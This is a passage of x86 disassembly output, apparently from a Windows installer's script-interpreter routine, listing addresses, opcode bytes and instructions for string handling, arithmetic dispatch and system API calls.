  4016d4:	eb 09                	jmp    0x4016df
  4016d6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4016dd:	88 1f                	mov    %bl,(%edi)
  4016df:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4016e2:	0f 85 a3 11 00 00    	jne    0x40288b
  4016e8:	68 00 20 00 00       	push   $0x2000
  4016ed:	57                   	push   %edi
  4016ee:	57                   	push   %edi
  4016ef:	ff 15 68 70 40 00    	call   *0x407068
  4016f5:	e9 91 11 00 00       	jmp    0x40288b
  4016fa:	6a ff                	push   $0xffffffff
  4016fc:	e8 f5 12 00 00       	call   0x4029f6
  401701:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401704:	51                   	push   %ecx
  401705:	56                   	push   %esi
  401706:	68 00 20 00 00       	push   $0x2000
  40170b:	53                   	push   %ebx
  40170c:	50                   	push   %eax
  40170d:	53                   	push   %ebx
  40170e:	ff 15 64 70 40 00    	call   *0x407064
  401714:	85 c0                	test   %eax,%eax
  401716:	0f 85 6f 11 00 00    	jne    0x40288b
  40171c:	e9 0f 0f 00 00       	jmp    0x402630
  401721:	6a ef                	push   $0xffffffef
  401723:	e8 ce 12 00 00       	call   0x4029f6
  401728:	50                   	push   %eax
  401729:	56                   	push   %esi
  40172a:	e8 e3 3f 00 00       	call   0x405712
  40172f:	e9 72 fe ff ff       	jmp    0x4015a6
  401734:	6a 31                	push   $0x31
  401736:	e8 bb 12 00 00       	call   0x4029f6
  40173b:	8b f0                	mov    %eax,%esi
  40173d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401740:	83 e0 07             	and    $0x7,%eax
  401743:	56                   	push   %esi
  401744:	89 75 f8             	mov    %esi,-0x8(%ebp)
  401747:	89 45 08             	mov    %eax,0x8(%ebp)
  40174a:	e8 1d 3e 00 00       	call   0x40556c
  40174f:	56                   	push   %esi
  401750:	be 80 9b 40 00       	mov    $0x409b80,%esi
  401755:	85 c0                	test   %eax,%eax
  401757:	74 08                	je     0x401761
  401759:	56                   	push   %esi
  40175a:	e8 ad 42 00 00       	call   0x405a0c
  40175f:	eb 17                	jmp    0x401778
  401761:	68 00 e0 47 00       	push   $0x47e000
  401766:	56                   	push   %esi
  401767:	e8 a0 42 00 00       	call   0x405a0c
  40176c:	50                   	push   %eax
  40176d:	e8 8d 3d 00 00       	call   0x4054ff
  401772:	50                   	push   %eax
  401773:	e8 b0 42 00 00       	call   0x405a28
  401778:	56                   	push   %esi
  401779:	e8 f0 44 00 00       	call   0x405c6e
  40177e:	bf 80 db 40 00       	mov    $0x40db80,%edi
  401783:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  401787:	7c 31                	jl     0x4017ba
  401789:	56                   	push   %esi
  40178a:	e8 78 45 00 00       	call   0x405d07
  40178f:	33 c9                	xor    %ecx,%ecx
  401791:	3b c3                	cmp    %ebx,%eax
  401793:	74 10                	je     0x4017a5
  401795:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401798:	83 c0 14             	add    $0x14,%eax
  40179b:	51                   	push   %ecx
  40179c:	50                   	push   %eax
  40179d:	ff 15 60 70 40 00    	call   *0x407060
  4017a3:	8b c8                	mov    %eax,%ecx
  4017a5:	8b 45 08             	mov    0x8(%ebp),%eax
  4017a8:	83 c0 fd             	add    $0xfffffffd,%eax
  4017ab:	0d 00 00 00 80       	or     $0x80000000,%eax
  4017b0:	23 c1                	and    %ecx,%eax
  4017b2:	f7 d8                	neg    %eax
  4017b4:	1b c0                	sbb    %eax,%eax
  4017b6:	40                   	inc    %eax
  4017b7:	89 45 08             	mov    %eax,0x8(%ebp)
  4017ba:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017bd:	75 06                	jne    0x4017c5
  4017bf:	56                   	push   %esi
  4017c0:	e8 ff 3e 00 00       	call   0x4056c4
  4017c5:	33 c0                	xor    %eax,%eax
  4017c7:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  4017cb:	0f 95 c0             	setne  %al
  4017ce:	40                   	inc    %eax
  4017cf:	50                   	push   %eax
  4017d0:	68 00 00 00 40       	push   $0x40000000
  4017d5:	56                   	push   %esi
  4017d6:	e8 08 3f 00 00       	call   0x4056e3
  4017db:	83 f8 ff             	cmp    $0xffffffff,%eax
  4017de:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4017e1:	75 76                	jne    0x401859
  4017e3:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017e6:	75 53                	jne    0x40183b
  4017e8:	68 00 20 45 00       	push   $0x452000
  4017ed:	57                   	push   %edi
  4017ee:	e8 19 42 00 00       	call   0x405a0c
  4017f3:	56                   	push   %esi
  4017f4:	68 00 20 45 00       	push   $0x452000
  4017f9:	e8 0e 42 00 00       	call   0x405a0c
  4017fe:	ff 75 f0             	push   -0x10(%ebp)
  401801:	68 80 bb 40 00       	push   $0x40bb80
  401806:	e8 23 42 00 00       	call   0x405a2e
  40180b:	57                   	push   %edi
  40180c:	68 00 20 45 00       	push   $0x452000
  401811:	e8 f6 41 00 00       	call   0x405a0c
  401816:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401819:	c1 f8 03             	sar    $0x3,%eax
  40181c:	50                   	push   %eax
  40181d:	68 80 bb 40 00       	push   $0x40bb80
  401822:	e8 a6 3a 00 00       	call   0x4052cd
  401827:	83 e8 04             	sub    $0x4,%eax
  40182a:	0f 84 53 ff ff ff    	je     0x401783
  401830:	48                   	dec    %eax
  401831:	74 1b                	je     0x40184e
  401833:	56                   	push   %esi
  401834:	6a fa                	push   $0xfffffffa
  401836:	e9 57 fc ff ff       	jmp    0x401492
  40183b:	ff 75 f8             	push   -0x8(%ebp)
  40183e:	6a e2                	push   $0xffffffe2
  401840:	e8 65 35 00 00       	call   0x404daa
  401845:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  401849:	e9 5a fd ff ff       	jmp    0x4015a8
  40184e:	ff 05 e8 1b 45 00    	incl   0x451be8
  401854:	e9 3b 10 00 00       	jmp    0x402894
  401859:	ff 75 f8             	push   -0x8(%ebp)
  40185c:	6a ea                	push   $0xffffffea
  40185e:	e8 47 35 00 00       	call   0x404daa
  401863:	ff 05 14 1c 45 00    	incl   0x451c14
  401869:	53                   	push   %ebx
  40186a:	53                   	push   %ebx
  40186b:	ff 75 cc             	push   -0x34(%ebp)
  40186e:	ff 75 e4             	push   -0x1c(%ebp)
  401871:	e8 e5 15 00 00       	call   0x402e5b
  401876:	ff 0d 14 1c 45 00    	decl   0x451c14
  40187c:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  401880:	8b f8                	mov    %eax,%edi
  401882:	75 06                	jne    0x40188a
  401884:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%ebp)
  401888:	74 12                	je     0x40189c
  40188a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40188d:	50                   	push   %eax
  40188e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401891:	53                   	push   %ebx
  401892:	50                   	push   %eax
  401893:	ff 75 cc             	push   -0x34(%ebp)
  401896:	ff 15 a8 70 40 00    	call   *0x4070a8
  40189c:	ff 75 cc             	push   -0x34(%ebp)
  40189f:	ff 15 ec 70 40 00    	call   *0x4070ec
  4018a5:	3b fb                	cmp    %ebx,%edi
  4018a7:	0f 8d de 0f 00 00    	jge    0x40288b
  4018ad:	83 ff fe             	cmp    $0xfffffffe,%edi
  4018b0:	75 13                	jne    0x4018c5
  4018b2:	6a e9                	push   $0xffffffe9
  4018b4:	56                   	push   %esi
  4018b5:	e8 74 41 00 00       	call   0x405a2e
  4018ba:	ff 75 f8             	push   -0x8(%ebp)
  4018bd:	56                   	push   %esi
  4018be:	e8 65 41 00 00       	call   0x405a28
  4018c3:	eb 08                	jmp    0x4018cd
  4018c5:	6a ee                	push   $0xffffffee
  4018c7:	56                   	push   %esi
  4018c8:	e8 61 41 00 00       	call   0x405a2e
  4018cd:	68 10 00 20 00       	push   $0x200010
  4018d2:	56                   	push   %esi
  4018d3:	e9 31 09 00 00       	jmp    0x402209
  4018d8:	53                   	push   %ebx
  4018d9:	eb 34                	jmp    0x40190f
  4018db:	6a 31                	push   $0x31
  4018dd:	e8 14 11 00 00       	call   0x4029f6
  4018e2:	ff 75 dc             	push   -0x24(%ebp)
  4018e5:	50                   	push   %eax
  4018e6:	e8 e2 39 00 00       	call   0x4052cd
  4018eb:	3b c3                	cmp    %ebx,%eax
  4018ed:	0f 84 69 0d 00 00    	je     0x40265c
  4018f3:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  4018f6:	0f 84 4a 01 00 00    	je     0x401a46
  4018fc:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  4018ff:	0f 85 86 0f 00 00    	jne    0x40288b
  401905:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401908:	e9 89 0f 00 00       	jmp    0x402896
  40190d:	6a f0                	push   $0xfffffff0
  40190f:	e8 e2 10 00 00       	call   0x4029f6
  401914:	ff 75 e0             	push   -0x20(%ebp)
  401917:	50                   	push   %eax
  401918:	e8 14 3a 00 00       	call   0x405331
  40191d:	e9 69 0f 00 00       	jmp    0x40288b
  401922:	6a 01                	push   $0x1
  401924:	e8 cd 10 00 00       	call   0x4029f6
  401929:	50                   	push   %eax
  40192a:	e8 f3 40 00 00       	call   0x405a22
  40192f:	e9 84 0b 00 00       	jmp    0x4024b8
  401934:	6a 02                	push   $0x2
  401936:	e8 9e 10 00 00       	call   0x4029d9
  40193b:	6a 03                	push   $0x3
  40193d:	89 45 08             	mov    %eax,0x8(%ebp)
  401940:	e8 94 10 00 00       	call   0x4029d9
  401945:	6a 01                	push   $0x1
  401947:	8b f8                	mov    %eax,%edi
  401949:	e8 a8 10 00 00       	call   0x4029f6
  40194e:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401951:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401954:	88 1e                	mov    %bl,(%esi)
  401956:	74 09                	je     0x401961
  401958:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40195b:	0f 84 2a 0f 00 00    	je     0x40288b
  401961:	50                   	push   %eax
  401962:	e8 bb 40 00 00       	call   0x405a22
  401967:	3b fb                	cmp    %ebx,%edi
  401969:	7d 08                	jge    0x401973
  40196b:	03 f8                	add    %eax,%edi
  40196d:	0f 88 18 0f 00 00    	js     0x40288b
  401973:	3b f8                	cmp    %eax,%edi
  401975:	7e 02                	jle    0x401979
  401977:	8b f8                	mov    %eax,%edi
  401979:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40197c:	03 c7                	add    %edi,%eax
  40197e:	50                   	push   %eax
  40197f:	56                   	push   %esi
  401980:	e8 87 40 00 00       	call   0x405a0c
  401985:	8b 7d 08             	mov    0x8(%ebp),%edi
  401988:	3b fb                	cmp    %ebx,%edi
  40198a:	0f 84 fb 0e 00 00    	je     0x40288b
  401990:	7d 0f                	jge    0x4019a1
  401992:	56                   	push   %esi
  401993:	e8 8a 40 00 00       	call   0x405a22
  401998:	03 f8                	add    %eax,%edi
  40199a:	79 05                	jns    0x4019a1
  40199c:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40199f:	8b fb                	mov    %ebx,%edi
  4019a1:	81 ff 00 20 00 00    	cmp    $0x2000,%edi
  4019a7:	0f 8d de 0e 00 00    	jge    0x40288b
  4019ad:	88 1c 37             	mov    %bl,(%edi,%esi,1)
  4019b0:	e9 d6 0e 00 00       	jmp    0x40288b
  4019b5:	6a 20                	push   $0x20
  4019b7:	e8 3a 10 00 00       	call   0x4029f6
  4019bc:	6a 31                	push   $0x31
  4019be:	8b f0                	mov    %eax,%esi
  4019c0:	e8 31 10 00 00       	call   0x4029f6
  4019c5:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4019c8:	50                   	push   %eax
  4019c9:	56                   	push   %esi
  4019ca:	75 12                	jne    0x4019de
  4019cc:	ff 15 f0 70 40 00    	call   *0x4070f0
  4019d2:	85 c0                	test   %eax,%eax
  4019d4:	75 70                	jne    0x401a46
  4019d6:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4019d9:	e9 b8 0e 00 00       	jmp    0x402896
  4019de:	ff 15 f4 70 40 00    	call   *0x4070f4
  4019e4:	eb ec                	jmp    0x4019d2
  4019e6:	33 ff                	xor    %edi,%edi
  4019e8:	47                   	inc    %edi
  4019e9:	57                   	push   %edi
  4019ea:	e8 07 10 00 00       	call   0x4029f6
  4019ef:	68 00 20 00 00       	push   $0x2000
  4019f4:	56                   	push   %esi
  4019f5:	50                   	push   %eax
  4019f6:	89 45 08             	mov    %eax,0x8(%ebp)
  4019f9:	ff 15 f8 70 40 00    	call   *0x4070f8
  4019ff:	85 c0                	test   %eax,%eax
  401a01:	74 13                	je     0x401a16
  401a03:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401a06:	74 13                	je     0x401a1b
  401a08:	56                   	push   %esi
  401a09:	ff 75 08             	push   0x8(%ebp)
  401a0c:	ff 15 f4 70 40 00    	call   *0x4070f4
  401a12:	85 c0                	test   %eax,%eax
  401a14:	75 05                	jne    0x401a1b
  401a16:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a19:	88 1e                	mov    %bl,(%esi)
  401a1b:	88 9e ff 1f 00 00    	mov    %bl,0x1fff(%esi)
  401a21:	e9 65 0e 00 00       	jmp    0x40288b
  401a26:	53                   	push   %ebx
  401a27:	e8 ad 0f 00 00       	call   0x4029d9
  401a2c:	6a 01                	push   $0x1
  401a2e:	8b f0                	mov    %eax,%esi
  401a30:	e8 a4 0f 00 00       	call   0x4029d9
  401a35:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  401a38:	75 08                	jne    0x401a42
  401a3a:	3b f0                	cmp    %eax,%esi
  401a3c:	7c 08                	jl     0x401a46
  401a3e:	7e 96                	jle    0x4019d6
  401a40:	eb 0e                	jmp    0x401a50
  401a42:	3b f0                	cmp    %eax,%esi
  401a44:	73 08                	jae    0x401a4e
  401a46:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a49:	e9 48 0e 00 00       	jmp    0x402896
  401a4e:	76 86                	jbe    0x4019d6
  401a50:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401a53:	e9 3e 0e 00 00       	jmp    0x402896
  401a58:	6a 01                	push   $0x1
  401a5a:	e8 7a 0f 00 00       	call   0x4029d9
  401a5f:	6a 02                	push   $0x2
  401a61:	8b f8                	mov    %eax,%edi
  401a63:	e8 71 0f 00 00       	call   0x4029d9
  401a68:	8b c8                	mov    %eax,%ecx
  401a6a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a6d:	83 f8 0c             	cmp    $0xc,%eax
  401a70:	77 6d                	ja     0x401adf
  401a72:	ff 24 85 a5 29 40 00 	jmp    *0x4029a5(,%eax,4)
  401a79:	03 f9                	add    %ecx,%edi
  401a7b:	eb 62                	jmp    0x401adf
  401a7d:	2b f9                	sub    %ecx,%edi
  401a7f:	eb 5e                	jmp    0x401adf
  401a81:	0f af cf             	imul   %edi,%ecx
  401a84:	8b f9                	mov    %ecx,%edi
  401a86:	eb 57                	jmp    0x401adf
  401a88:	3b cb                	cmp    %ebx,%ecx
  401a8a:	74 42                	je     0x401ace
  401a8c:	8b c7                	mov    %edi,%eax
  401a8e:	99                   	cltd
  401a8f:	f7 f9                	idiv   %ecx
  401a91:	8b f8                	mov    %eax,%edi
  401a93:	eb 4a                	jmp    0x401adf
  401a95:	0b f9                	or     %ecx,%edi
  401a97:	eb 46                	jmp    0x401adf
  401a99:	23 f9                	and    %ecx,%edi
  401a9b:	eb 42                	jmp    0x401adf
  401a9d:	33 f9                	xor    %ecx,%edi
  401a9f:	eb 3e                	jmp    0x401adf
  401aa1:	33 c0                	xor    %eax,%eax
  401aa3:	3b fb                	cmp    %ebx,%edi
  401aa5:	0f 94 c0             	sete   %al
  401aa8:	eb e7                	jmp    0x401a91
  401aaa:	3b fb                	cmp    %ebx,%edi
  401aac:	75 0e                	jne    0x401abc
  401aae:	eb 08                	jmp    0x401ab8
  401ab0:	33 ff                	xor    %edi,%edi
  401ab2:	eb 2b                	jmp    0x401adf
  401ab4:	3b fb                	cmp    %ebx,%edi
  401ab6:	74 f8                	je     0x401ab0
  401ab8:	3b cb                	cmp    %ebx,%ecx
  401aba:	74 f4                	je     0x401ab0
  401abc:	33 ff                	xor    %edi,%edi
  401abe:	47                   	inc    %edi
  401abf:	eb 1e                	jmp    0x401adf
  401ac1:	3b cb                	cmp    %ebx,%ecx
  401ac3:	74 09                	je     0x401ace
  401ac5:	8b c7                	mov    %edi,%eax
  401ac7:	99                   	cltd
  401ac8:	f7 f9                	idiv   %ecx
  401aca:	8b fa                	mov    %edx,%edi
  401acc:	eb 11                	jmp    0x401adf
  401ace:	33 ff                	xor    %edi,%edi
  401ad0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401ad7:	eb 06                	jmp    0x401adf
  401ad9:	d3 e7                	shl    %cl,%edi
  401adb:	eb 02                	jmp    0x401adf
  401add:	d3 ff                	sar    %cl,%edi
  401adf:	57                   	push   %edi
  401ae0:	e9 7c fa ff ff       	jmp    0x401561
  401ae5:	6a 01                	push   $0x1
  401ae7:	e8 0a 0f 00 00       	call   0x4029f6
  401aec:	6a 02                	push   $0x2
  401aee:	8b f8                	mov    %eax,%edi
  401af0:	e8 e4 0e 00 00       	call   0x4029d9
  401af5:	50                   	push   %eax
  401af6:	57                   	push   %edi
  401af7:	56                   	push   %esi
  401af8:	ff 15 00 72 40 00    	call   *0x407200
  401afe:	83 c4 0c             	add    $0xc,%esp
  401b01:	e9 85 0d 00 00       	jmp    0x40288b
  401b06:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401b09:	8b 3d 80 3b 41 00    	mov    0x413b80,%edi
  401b0f:	3b c3                	cmp    %ebx,%eax
  401b11:	74 44                	je     0x401b57
  401b13:	48                   	dec    %eax
  401b14:	3b fb                	cmp    %ebx,%edi
  401b16:	0f 84 df 06 00 00    	je     0x4021fb
  401b1c:	8b 3f                	mov    (%edi),%edi
  401b1e:	3b c3                	cmp    %ebx,%eax
  401b20:	75 f1                	jne    0x401b13
  401b22:	3b fb                	cmp    %ebx,%edi
  401b24:	0f 84 d1 06 00 00    	je     0x4021fb
  401b2a:	83 c7 04             	add    $0x4,%edi
  401b2d:	be 80 9b 40 00       	mov    $0x409b80,%esi
  401b32:	57                   	push   %edi
  401b33:	56                   	push   %esi
  401b34:	e8 d3 3e 00 00       	call   0x405a0c
  401b39:	a1 80 3b 41 00       	mov    0x413b80,%eax
  401b3e:	83 c0 04             	add    $0x4,%eax
  401b41:	50                   	push   %eax
  401b42:	57                   	push   %edi
  401b43:	e8 c4 3e 00 00       	call   0x405a0c
  401b48:	a1 80 3b 41 00       	mov    0x413b80,%eax
  401b4d:	56                   	push   %esi
  401b4e:	83 c0 04             	add    $0x4,%eax
  401b51:	50                   	push   %eax
  401b52:	e9 5a 0c 00 00       	jmp    0x4027b1
  401b57:	3b d3                	cmp    %ebx,%edx
  401b59:	74 25                	je     0x401b80
  401b5b:	3b fb                	cmp    %ebx,%edi
  401b5d:	0f 84 f9 0a 00 00    	je     0x40265c
  401b63:	8d 47 04             	lea    0x4(%edi),%eax
  401b66:	50                   	push   %eax
  401b67:	56                   	push   %esi
  401b68:	e8 9f 3e 00 00       	call   0x405a0c
  401b6d:	8b 07                	mov    (%edi),%eax
  401b6f:	57                   	push   %edi
  401b70:	a3 80 3b 41 00       	mov    %eax,0x413b80
  401b75:	ff 15 fc 70 40 00    	call   *0x4070fc
  401b7b:	e9 0b 0d 00 00       	jmp    0x40288b
  401b80:	68 04 20 00 00       	push   $0x2004
  401b85:	6a 40                	push   $0x40
  401b87:	ff 15 00 71 40 00    	call   *0x407100
  401b8d:	ff 75 dc             	push   -0x24(%ebp)
  401b90:	8b f0                	mov    %eax,%esi
  401b92:	8d 46 04             	lea    0x4(%esi),%eax
  401b95:	50                   	push   %eax
  401b96:	e8 93 3e 00 00       	call   0x405a2e
  401b9b:	a1 80 3b 41 00       	mov    0x413b80,%eax
  401ba0:	89 06                	mov    %eax,(%esi)
  401ba2:	89 35 80 3b 41 00    	mov    %esi,0x413b80
  401ba8:	e9 de 0c 00 00       	jmp    0x40288b
  401bad:	6a 03                	push   $0x3
  401baf:	e8 25 0e 00 00       	call   0x4029d9
  401bb4:	6a 04                	push   $0x4
  401bb6:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401bb9:	e8 1b 0e 00 00       	call   0x4029d9
  401bbe:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
  401bc2:	89 45 08             	mov    %eax,0x8(%ebp)
  401bc5:	74 0a                	je     0x401bd1
  401bc7:	6a 33                	push   $0x33
  401bc9:	e8 28 0e 00 00       	call   0x4029f6
  401bce:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401bd1:	f6 45 f0 02          	testb  $0x2,-0x10(%ebp)
  401bd5:	74 0a                	je     0x401be1
  401bd7:	6a 44                	push   $0x44
  401bd9:	e8 18 0e 00 00       	call   0x4029f6
  401bde:	89 45 08             	mov    %eax,0x8(%ebp)
  401be1:	83 7d d8 21          	cmpl   $0x21,-0x28(%ebp)
  401be5:	6a 01                	push   $0x1
  401be7:	75 44                	jne    0x401c2d
  401be9:	e8 eb 0d 00 00       	call   0x4029d9
  401bee:	6a 02                	push   $0x2
  401bf0:	8b f8                	mov    %eax,%edi
  401bf2:	e8 e2 0d 00 00       	call   0x4029d9
  401bf7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401bfa:	c1 f9 02             	sar    $0x2,%ecx
  401bfd:	74 1e                	je     0x401c1d
  401bff:	8d 55 f8             	lea    -0x8(%ebp),%edx
  401c02:	52                   	push   %edx
  401c03:	51                   	push   %ecx
  401c04:	53                   	push   %ebx
  401c05:	ff 75 08             	push   0x8(%ebp)
  401c08:	ff 75 cc             	push   -0x34(%ebp)
  401c0b:	50                   	push   %eax
  401c0c:	57                   	push   %edi
  401c0d:	ff 15 04 72 40 00    	call   *0x407204
  401c13:	f7 d8                	neg    %eax
  401c15:	1b c0                	sbb    %eax,%eax
  401c17:	40                   	inc    %eax
  401c18:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c1b:	eb 3f                	jmp    0x401c5c
  401c1d:	ff 75 08             	push   0x8(%ebp)
  401c20:	ff 75 cc             	push   -0x34(%ebp)
  401c23:	50                   	push   %eax
  401c24:	57                   	push   %edi
  401c25:	ff 15 44 72 40 00    	call   *0x407244
  401c2b:	eb 2c                	jmp    0x401c59
  401c2d:	e8 c4 0d 00 00       	call   0x4029f6
  401c32:	6a 12                	push   $0x12
  401c34:	8b f8                	mov    %eax,%edi
  401c36:	e8 bb 0d 00 00       	call   0x4029f6
  401c3b:	8a 08                	mov    (%eax),%cl
  401c3d:	f6 d9                	neg    %cl
  401c3f:	1b c9                	sbb    %ecx,%ecx
  401c41:	23 c8                	and    %eax,%ecx
  401c43:	8a 07                	mov    (%edi),%al
  401c45:	f6 d8                	neg    %al
  401c47:	1b c0                	sbb    %eax,%eax
  401c49:	51                   	push   %ecx
  401c4a:	23 c7                	and    %edi,%eax
  401c4c:	50                   	push   %eax
  401c4d:	ff 75 08             	push   0x8(%ebp)
  401c50:	ff 75 cc             	push   -0x34(%ebp)
  401c53:	ff 15 08 72 40 00    	call   *0x407208
  401c59:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c5c:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401c5f:	0f 8c 26 0c 00 00    	jl     0x40288b
  401c65:	ff 75 f8             	push   -0x8(%ebp)
  401c68:	e9 f4 f8 ff ff       	jmp    0x401561
  401c6d:	53                   	push   %ebx
  401c6e:	e8 66 0d 00 00       	call   0x4029d9
  401c73:	50                   	push   %eax
  401c74:	ff 15 28 72 40 00    	call   *0x407228
  401c7a:	85 c0                	test   %eax,%eax
  401c7c:	0f 84 54 fd ff ff    	je     0x4019d6
  401c82:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401c85:	e9 0c 0c 00 00       	jmp    0x402896
  401c8a:	6a 02                	push   $0x2
  401c8c:	e8 48 0d 00 00       	call   0x4029d9
  401c91:	50                   	push   %eax
  401c92:	6a 01                	push   $0x1
  401c94:	e8 40 0d 00 00       	call   0x4029d9
  401c99:	50                   	push   %eax
  401c9a:	ff 15 2c 72 40 00    	call   *0x40722c
  401ca0:	e9 13 08 00 00       	jmp    0x4024b8
  401ca5:	a1 a8 1b 45 00       	mov    0x451ba8,%eax
  401caa:	03 c2                	add    %edx,%eax
  401cac:	50                   	push   %eax
  401cad:	6a eb                	push   $0xffffffeb
  401caf:	53                   	push   %ebx
  401cb0:	e8 24 0d 00 00       	call   0x4029d9
  401cb5:	50                   	push   %eax
  401cb6:	ff 15 30 72 40 00    	call   *0x407230
  401cbc:	e9 ca 0b 00 00       	jmp    0x40288b
  401cc1:	52                   	push   %edx
  401cc2:	ff 75 cc             	push   -0x34(%ebp)
  401cc5:	ff 15 2c 72 40 00    	call   *0x40722c
  401ccb:	8b f0                	mov    %eax,%esi
  401ccd:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401cd0:	50                   	push   %eax
  401cd1:	56                   	push   %esi
  401cd2:	ff 15 50 72 40 00    	call   *0x407250
  401cd8:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401cdb:	6a 10                	push   $0x10
  401cdd:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401ce1:	50                   	push   %eax
  401ce2:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401ce5:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401ce9:	50                   	push   %eax
  401cea:	53                   	push   %ebx
  401ceb:	53                   	push   %ebx
  401cec:	e8 05 0d 00 00       	call   0x4029f6
  401cf1:	50                   	push   %eax
  401cf2:	53                   	push   %ebx
  401cf3:	ff 15 34 72 40 00    	call   *0x407234
  401cf9:	50                   	push   %eax
  401cfa:	53                   	push   %ebx
  401cfb:	68 72 01 00 00       	push   $0x172
  401d00:	56                   	push   %esi
  401d01:	ff 15 44 72 40 00    	call   *0x407244
  401d07:	3b c3                	cmp    %ebx,%eax
  401d09:	0f 84 7c 0b 00 00    	je     0x40288b
  401d0f:	50                   	push   %eax
  401d10:	ff 15 44 70 40 00    	call   *0x407044
  401d16:	e9 70 0b 00 00       	jmp    0x40288b
  401d1b:	6a 48                	push   $0x48
  401d1d:	6a 5a                	push   $0x5a
  401d1f:	ff 75 cc             	push   -0x34(%ebp)
  401d22:	ff 15 38 72 40 00    	call   *0x407238
  401d28:	50                   	push   %eax
  401d29:	ff 15 40 70 40 00    	call   *0x407040
  401d2f:	50                   	push   %eax
  401d30:	6a 02                	push   $0x2
  401d32:	e8 a2 0c 00 00       	call   0x4029d9
  401d37:	50                   	push   %eax
  401d38:	ff 15 30 71 40 00    	call   *0x407130
  401d3e:	f7 d8                	neg    %eax
  401d40:	6a 03                	push   $0x3
  401d42:	a3 84 3b 41 00       	mov    %eax,0x413b84
  401d47:	e8 8d 0c 00 00       	call   0x4029d9
  401d4c:	a3 94 3b 41 00       	mov    %eax,0x413b94
  401d51:	8a 45 ec             	mov    -0x14(%ebp),%al
  401d54:	ff 75 e0             	push   -0x20(%ebp)
  401d57:	8a c8                	mov    %al,%cl
  401d59:	80 e1 01             	and    $0x1,%cl
  401d5c:	c6 05 9b 3b 41 00 01 	movb   $0x1,0x413b9b
  401d63:	88 0d 98 3b 41 00    	mov    %cl,0x413b98
  401d69:	8a c8                	mov    %al,%cl
  401d6b:	80 e1 02             	and    $0x2,%cl
  401d6e:	24 04                	and    $0x4,%al
  401d70:	68 a0 3b 41 00       	push   $0x413ba0
  401d75:	88 0d 99 3b 41 00    	mov    %cl,0x413b99
  401d7b:	a2 9a 3b 41 00       	mov    %al,0x413b9a
  401d80:	e8 a9 3c 00 00       	call   0x405a2e
  401d85:	68 84 3b 41 00       	push   $0x413b84
  401d8a:	ff 15 4c 70 40 00    	call   *0x40704c
  401d90:	e9 23 07 00 00       	jmp    0x4024b8
  401d95:	53                   	push   %ebx
  401d96:	e8 3e 0c 00 00       	call   0x4029d9
  401d9b:	6a 01                	push   $0x1
  401d9d:	8b f0                	mov    %eax,%esi
  401d9f:	e8 35 0c 00 00       	call   0x4029d9
  401da4:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401da7:	50                   	push   %eax
  401da8:	56                   	push   %esi
  401da9:	75 0b                	jne    0x401db6
  401dab:	ff 15 60 72 40 00    	call   *0x407260
  401db1:	e9 d5 0a 00 00       	jmp    0x40288b
  401db6:	ff 15 3c 72 40 00    	call   *0x40723c
  401dbc:	e9 ca 0a 00 00       	jmp    0x40288b
  401dc1:	53                   	push   %ebx
  401dc2:	e8 2f 0c 00 00       	call   0x4029f6
  401dc7:	6a 31                	push   $0x31
  401dc9:	8b f0                	mov    %eax,%esi
  401dcb:	e8 26 0c 00 00       	call   0x4029f6
  401dd0:	6a 22                	push   $0x22
  401dd2:	8b d8                	mov    %eax,%ebx
  401dd4:	e8 1d 0c 00 00       	call   0x4029f6
  401dd9:	6a 15                	push   $0x15
  401ddb:	8b f8                	mov    %eax,%edi
  401ddd:	e8 14 0c 00 00       	call   0x4029f6
  401de2:	6a ec                	push   $0xffffffec
  401de4:	e8 3a f6 ff ff       	call   0x401423
  401de9:	8a 07                	mov    (%edi),%al
  401deb:	ff 75 e8             	push   -0x18(%ebp)
  401dee:	f6 d8                	neg    %al
  401df0:	1b c0                	sbb    %eax,%eax
  401df2:	68 00 e0 47 00       	push   $0x47e000
  401df7:	23 c7                	and    %edi,%eax
  401df9:	50                   	push   %eax
  401dfa:	8a 06                	mov    (%esi),%al
  401dfc:	f6 d8                	neg    %al
